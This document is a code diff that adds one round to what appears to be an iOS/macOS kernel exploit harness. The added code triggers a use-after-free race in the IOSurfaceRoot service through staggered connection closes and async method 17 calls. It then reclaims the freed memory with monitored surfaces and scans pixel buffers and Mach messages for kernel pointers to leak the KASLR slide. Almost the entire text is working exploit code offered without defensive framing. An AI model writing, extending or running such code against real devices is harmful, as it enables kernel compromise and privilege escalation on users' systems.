@@ -32007,6 +32007,281 @@ new_modes:
                 goto phase17_done;
             }
 
+            /* ================================================================
+             * r=233: Post-UAF side-effect detection on replacement IOSurface
+             *
+             * Uses the proven r=220 race+reclaim pattern. After the compositor
+             * traverses stale notification entries pointing to our replacement
+             * IOSurface objects, checks for observable side effects:
+             *
+             * 1. Seed counter changes (compositor lock/unlock)
+             * 2. Pixel buffer writes (compositor writing through our surface)
+             * 3. Property value changes
+             * 4. Notification messages on our ports
+             *
+             * The compositor reads entry->slot2 + 0xD8 from our object.
+             * If it also WRITES (e.g., clearing a dirty flag, updating a
+             * counter, sending a notification), we can observe the write
+             * and potentially extract kernel pointer information.
+             * ================================================================ */
+            if (rounds == 233) {
+                rlog("\n=== r=233: Post-UAF side-effect detection ===\n");
+
+                io_service_t svc233 = IOServiceGetMatchingService(kIOMasterPortDefault,
+                    IOServiceMatching("IOSurfaceRoot"));
+                if (!svc233) { rlog("  NO IOSurfaceRoot!\n"); goto phase17_done; }
+
+                /* Create IOSurface with mapped pixel buffer for monitoring */
+                CFMutableDictionaryRef sp233 = CFDictionaryCreateMutable(NULL, 0,
+                    &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+                int w233 = 64, h233 = 64, bpe233 = 4, bpr233 = w233 * bpe233;
+                CFNumberRef wn233 = CFNumberCreate(NULL, kCFNumberIntType, &w233);
+                CFNumberRef hn233 = CFNumberCreate(NULL, kCFNumberIntType, &h233);
+                CFNumberRef bn233 = CFNumberCreate(NULL, kCFNumberIntType, &bpe233);
+                CFNumberRef rn233 = CFNumberCreate(NULL, kCFNumberIntType, &bpr233);
+                int pf233 = 0x42475241;
+                CFNumberRef pfn233 = CFNumberCreate(NULL, kCFNumberIntType, &pf233);
+                CFDictionarySetValue(sp233, CFSTR("IOSurfaceWidth"), wn233);
+                CFDictionarySetValue(sp233, CFSTR("IOSurfaceHeight"), hn233);
+                CFDictionarySetValue(sp233, CFSTR("IOSurfaceBytesPerElement"), bn233);
+                CFDictionarySetValue(sp233, CFSTR("IOSurfaceBytesPerRow"), rn233);
+                CFDictionarySetValue(sp233, CFSTR("IOSurfacePixelFormat"), pfn233);
+
+                uint64_t inp233[3] = {1, 2, 3};
+                int r233_side_effects = 0;
+                uint64_t r233_leaked = 0;
+
+                /* Notification receive ports for monitoring */
+                #define R233_NPORTS 16
+                mach_port_t r233_nports[R233_NPORTS];
+                for (int i = 0; i < R233_NPORTS; i++) {
+                    mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &r233_nports[i]);
+                    mach_port_insert_right(mach_task_self(), r233_nports[i], r233_nports[i],
+                        MACH_MSG_TYPE_MAKE_SEND);
+                }
+
+                /* Start render loop for compositor traversal */
+                p13_render_run = 1;
+                p13_render_frames = 0;
+                pthread_t r233_rt;
+                pthread_create(&r233_rt, NULL, p13_render_loop, NULL);
+                usleep(100000);
+                rlog("  Render loop started, frames=%d\n", p13_render_frames);
+
+                for (int cycle = 0; cycle < 20; cycle++) {
+                    /* Create reclaim surfaces and record baseline state */
+                    IOSurfaceRef mon_surfs[R233_NPORTS];
+                    uint32_t pre_seeds[R233_NPORTS];
+                    for (int i = 0; i < R233_NPORTS; i++) {
+                        mon_surfs[i] = IOSurfaceCreate(sp233);
+                        if (mon_surfs[i]) {
+                            /* Zero-fill pixel buffer */
+                            IOSurfaceLock(mon_surfs[i], 0, NULL);
+                            void *base = IOSurfaceGetBaseAddress(mon_surfs[i]);
+                            if (base) memset(base, 0xCC, IOSurfaceGetAllocSize(mon_surfs[i]));
+                            IOSurfaceUnlock(mon_surfs[i], 0, NULL);
+                            /* Record baseline seed */
+                            pre_seeds[i] = IOSurfaceGetSeed(mon_surfs[i]);
+                            /* Set a known marker property */
+                            int marker = 0x233A0000 | (cycle << 8) | i;
+                            CFNumberRef mv = CFNumberCreate(NULL, kCFNumberIntType, &marker);
+                            IOSurfaceSetValue(mon_surfs[i], CFSTR("_r233_marker"), mv);
+                            CFRelease(mv);
+                        }
+                    }
+
+                    /* Phase 1: v_race8 — open 8 connections, register sel17, stagger close */
+                    io_connect_t cs233[8];
+                    int have233[8];
+                    for (int i = 0; i < 8; i++) {
+                        have233[i] = (IOServiceOpen(svc233, mach_task_self(), 0, &cs233[i]) == KERN_SUCCESS);
+                        if (have233[i]) {
+                            uint64_t ref = 0xDEAD233000000000ULL | cycle;
+                            IOConnectCallAsyncMethod(cs233[i], 17, r233_nports[i % R233_NPORTS], &ref, 1,
+                                NULL, 0, inp233, 24, NULL, NULL, NULL, NULL);
+                        } else cs233[i] = IO_OBJECT_NULL;
+                    }
+
+                    /* Spam threads */
+                    p13_spam_run = 1;
+                    p13_spam_conn = have233[0] ? cs233[0] : IO_OBJECT_NULL;
+                    p13_spam_shape = 0;
+                    p13_spam_count = 0;
+                    pthread_t spam233[8];
+                    for (int t = 0; t < 8; t++)
+                        pthread_create(&spam233[t], NULL, p13_spam_reg, NULL);
+
+                    /* Staggered close */
+                    for (int r = 0; r < 3; r++)
+                        for (int i = 0; i < 8; i++) {
+                            int j = (i * 5 + r * 3) % 8;
+                            if (have233[j]) { IOServiceClose(cs233[j]); have233[j] = 0; }
+                            usleep(20 + (cycle % 10) * 7);
+                        }
+
+                    /* Reclaim with monitored surfaces */
+                    io_connect_t reclaim233[R233_NPORTS];
+                    int reclaim_ok = 0;
+                    for (int i = 0; i < R233_NPORTS; i++) {
+                        if (!mon_surfs[i]) { reclaim233[i] = IO_OBJECT_NULL; continue; }
+                        if (IOServiceOpen(svc233, mach_task_self(), 0, &reclaim233[i]) == KERN_SUCCESS) {
+                            uint64_t ref = 0xAAAA233000000000ULL | (cycle << 8) | i;
+                            uint64_t rinp[3];
+                            rinp[0] = IOSurfaceGetID(mon_surfs[i]);
+                            rinp[1] = 0xBBBB000000000000ULL | i;
+                            rinp[2] = 0;
+                            kern_return_t rr = IOConnectCallAsyncMethod(reclaim233[i], 17,
+                                r233_nports[i], &ref, 1,
+                                NULL, 0, rinp, 24, NULL, NULL, NULL, NULL);
+                            if (rr == KERN_SUCCESS) reclaim_ok++;
+                        } else reclaim233[i] = IO_OBJECT_NULL;
+                    }
+
+                    p13_spam_run = 0;
+                    for (int t = 0; t < 8; t++) pthread_join(spam233[t], NULL);
+                    for (int i = 0; i < 8; i++) if (have233[i]) IOServiceClose(cs233[i]);
+
+                    /* Let compositor run several frames with reclaimed entries */
+                    usleep(200000);
+
+                    /* ========== CHECK FOR SIDE EFFECTS ========== */
+
+                    /* Check 1: Seed counter changes */
+                    int seed_changed = 0;
+                    for (int i = 0; i < R233_NPORTS; i++) {
+                        if (!mon_surfs[i]) continue;
+                        uint32_t post_seed = IOSurfaceGetSeed(mon_surfs[i]);
+                        if (post_seed != pre_seeds[i]) {
+                            rlog("  *** SEED CHANGE surf[%d]: %u -> %u ***\n",
+                                i, pre_seeds[i], post_seed);
+                            seed_changed++;
+                            r233_side_effects++;
+                        }
+                    }
+
+                    /* Check 2: Pixel buffer writes (scan for kernel pointers) */
+                    int px_changed = 0;
+                    for (int i = 0; i < R233_NPORTS; i++) {
+                        if (!mon_surfs[i]) continue;
+                        IOSurfaceLock(mon_surfs[i], kIOSurfaceLockReadOnly, NULL);
+                        void *base = IOSurfaceGetBaseAddress(mon_surfs[i]);
+                        size_t alloc = IOSurfaceGetAllocSize(mon_surfs[i]);
+                        if (base && alloc >= 8) {
+                            uint64_t *p64 = (uint64_t *)base;
+                            size_t nqw = alloc / 8;
+                            int changed_count = 0;
+                            for (size_t qi = 0; qi < nqw; qi++) {
+                                if (p64[qi] != 0xCCCCCCCCCCCCCCCCULL) {
+                                    changed_count++;
+                                    if (changed_count <= 3) {
+                                        rlog("  PX-CHG surf[%d]+%zu: 0x%016llx (was 0xCCCC...)\n",
+                                            i, qi * 8, (unsigned long long)p64[qi]);
+                                    }
+                                    if ((p64[qi] & 0xFFFFFF0000000000ULL) == 0xFFFFFE0000000000ULL) {
+                                        rlog("  *** KPTR IN PIXELS surf[%d]+%zu=0x%016llx ***\n",
+                                            i, qi * 8, (unsigned long long)p64[qi]);
+                                        if (!r233_leaked) r233_leaked = p64[qi];
+                                        r233_side_effects++;
+                                    }
+                                }
+                            }
+                            if (changed_count > 0) {
+                                px_changed++;
+                                rlog("  surf[%d]: %d qwords changed in pixel buffer\n",
+                                    i, changed_count);
+                            }
+                        }
+                        IOSurfaceUnlock(mon_surfs[i], kIOSurfaceLockReadOnly, NULL);
+                    }
+
+                    /* Check 3: Mach notification messages */
+                    int msgs_recv = 0;
+                    for (int i = 0; i < R233_NPORTS; i++) {
+                        struct {
+                            mach_msg_header_t header;
+                            uint8_t body[512];
+                        } msg;
+                        memset(&msg, 0, sizeof(msg));
+                        msg.header.msgh_size = sizeof(msg);
+                        msg.header.msgh_local_port = r233_nports[i];
+                        mach_msg_return_t mr = mach_msg(&msg.header,
+                            MACH_RCV_MSG | MACH_RCV_TIMEOUT, 0,
+                            sizeof(msg), r233_nports[i], 0, MACH_PORT_NULL);
+                        if (mr == MACH_MSG_SUCCESS) {
+                            msgs_recv++;
+                            rlog("  *** MSG on port[%d]: id=0x%x sz=%u ***\n",
+                                i, msg.header.msgh_id, msg.header.msgh_size);
+                            /* Scan message body for kernel pointers */
+                            uint64_t *mp = (uint64_t *)&msg;
+                            int msz = msg.header.msgh_size / 8;
+                            for (int qi = 0; qi < msz; qi++) {
+                                if ((mp[qi] & 0xFFFFFF0000000000ULL) == 0xFFFFFE0000000000ULL) {
+                                    rlog("  *** KPTR IN MSG[%d]+%d=0x%016llx ***\n",
+                                        i, qi * 8, (unsigned long long)mp[qi]);
+                                    if (!r233_leaked) r233_leaked = mp[qi];
+                                    r233_side_effects++;
+                                }
+                            }
+                        }
+                    }
+
+                    /* Check 4: IOSurface properties for unexpected values */
+                    for (int i = 0; i < R233_NPORTS; i++) {
+                        if (!mon_surfs[i]) continue;
+                        uint32_t w = IOSurfaceGetWidth(mon_surfs[i]);
+                        uint32_t h = IOSurfaceGetHeight(mon_surfs[i]);
+                        size_t ab = IOSurfaceGetAllocSize(mon_surfs[i]);
+                        int uc = IOSurfaceGetUseCount(mon_surfs[i]);
+                        if (w != 64 || h != 64) {
+                            rlog("  *** CONFUSED surf[%d]: w=%u h=%u alloc=%zu uc=%d ***\n",
+                                i, w, h, ab, uc);
+                            r233_side_effects++;
+                        }
+                        if (uc != 0 && cycle == 0 && i < 2) {
+                            rlog("    surf[%d]: use_count=%d (may indicate compositor touch)\n",
+                                i, uc);
+                        }
+                    }
+
+                    rlog("  cycle[%d]: reclaim=%d seed_chg=%d px_chg=%d msgs=%d frames=%d\n",
+                        cycle, reclaim_ok, seed_changed, px_changed, msgs_recv,
+                        p13_render_frames);
+
+                    /* Cleanup cycle */
+                    for (int i = 0; i < R233_NPORTS; i++) {
+                        if (reclaim233[i]) IOServiceClose(reclaim233[i]);
+                        if (mon_surfs[i]) CFRelease(mon_surfs[i]);
+                    }
+
+                    if (r233_leaked) {
+                        rlog("  EARLY EXIT — kernel pointer found!\n");
+                        break;
+                    }
+                }
+
+                p13_render_run = 0;
+                pthread_join(r233_rt, NULL);
+
+                /* Cleanup ports */
+                for (int i = 0; i < R233_NPORTS; i++) {
+                    mach_port_deallocate(mach_task_self(), r233_nports[i]);
+                }
+                #undef R233_NPORTS
+
+                rlog("\n  r=233 summary: side_effects=%d\n", r233_side_effects);
+                if (r233_leaked) {
+                    rlog("  *** KASLR LEAK: 0x%016llx ***\n", (unsigned long long)r233_leaked);
+                } else {
+                    rlog("  No kernel pointers detected in side effects.\n");
+                }
+
+                CFRelease(wn233); CFRelease(hn233); CFRelease(bn233); CFRelease(rn233); CFRelease(pfn233);
+                CFRelease(sp233);
+                IOObjectRelease(svc233);
+                rlog("=== r=233 complete ===\n");
+                goto phase17_done;
+            }
+
             if (rounds == 228) {
                 rlog("\n=== r=228: IOSurface notification message inspection ===\n");
 
